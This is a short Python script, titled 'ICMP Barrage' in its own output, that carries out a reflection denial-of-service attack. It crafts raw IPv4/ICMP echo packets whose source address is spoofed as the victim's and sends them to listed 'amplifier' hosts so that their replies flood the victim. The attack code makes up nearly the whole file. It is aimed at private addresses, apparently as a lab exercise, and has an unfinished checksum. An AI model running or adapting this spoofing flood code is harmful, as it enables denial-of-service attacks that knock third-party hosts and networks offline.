import socket
import struct
from sys import byteorder
from binascii import unhexlify

def compute_checksum(data):
	''' Compute the checksum of an IP packet '''
	# sum the data as a series of 16-bit integers
	acc = sum([int(data[i:i+2].hex(), 16) for i in range(0, len(data), 2)])
	# add carry
	acc = (acc >> 16) + (acc & 0xffff)
	acc += (acc >> 16)
	# return the one's complement of the sum
	return ((~acc) & 0xffff).to_bytes(2, byteorder)

def construct_ICMP_payload(payload):
	''' Construct the core ICMP payload '''
	ping_type = b'\x08'
	ping_code = b'\x00'
	headers = b'\x00' * 32
	# serialize data with zeroed out checksum field
	data = ping_type + ping_code + b'\x00\x00' + headers + payload
	# compute checksum
	checksum = compute_checksum(data)
	# serialize ICMP packet with computed checksum
	return ping_type + ping_code + checksum + headers + payload

def construct_IP_packet(src, dest):
	''' Construct an IPv4 packet '''
	# FIXME fill in IP packet address fields dynamically and compute checksum
	v_ihl = 0x45 # set version number to 4 (IPv4) # set ihl value to 5 (no options field included)
	tos = 0x00
	length = 0x00 # let length be filled in by kernel
	ident = 54321 # set packet identity number
	flags = 0x00
	ttl = 0xff # ttl set to max lifetime of 255
	protocol = 0x01 # set to IP protocol 1 (ICMP)
	header_chksm = 0x00 # compute header checksum
	source_ip = socket.inet_aton(src)
	dest_ip = socket.inet_aton(dest)
	return struct.pack('!BBHHHBBH4s4s', v_ihl, tos, length, ident, flags, ttl, protocol, header_chksm, source_ip, dest_ip)

def print_header(target):
	''' Print headers to the ICMP Barrage program '''
	print(f'##################\n## ICMP BARRAGE ##\n##################\nOrchestrating barrage on {target}')

def icmp_barrage(target, amplifiers):
	''' Send ping packets to the relays with source IP spoofed '''
	# create IP socket
	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
	# craft ICMP datagram
	icmp_payload = construct_ICMP_payload(b"\x00")
	# print ICMP barrage headers
	print_header(target)
	# iterate through amplifiers
	for dest in amplifiers:
		# craft an IP packet with the victim's source IP and amplifier's destination IP
		ip_packet = construct_IP_packet(target, dest)
		# append ICMP payload to IP header
		packet = ip_packet + icmp_payload
		# send malicious packet to the amplifier
		sock.sendto(packet, (dest, 0))

if __name__ == "__main__":
	icmp_barrage('192.168.1.58', ['192.168.1.62'])
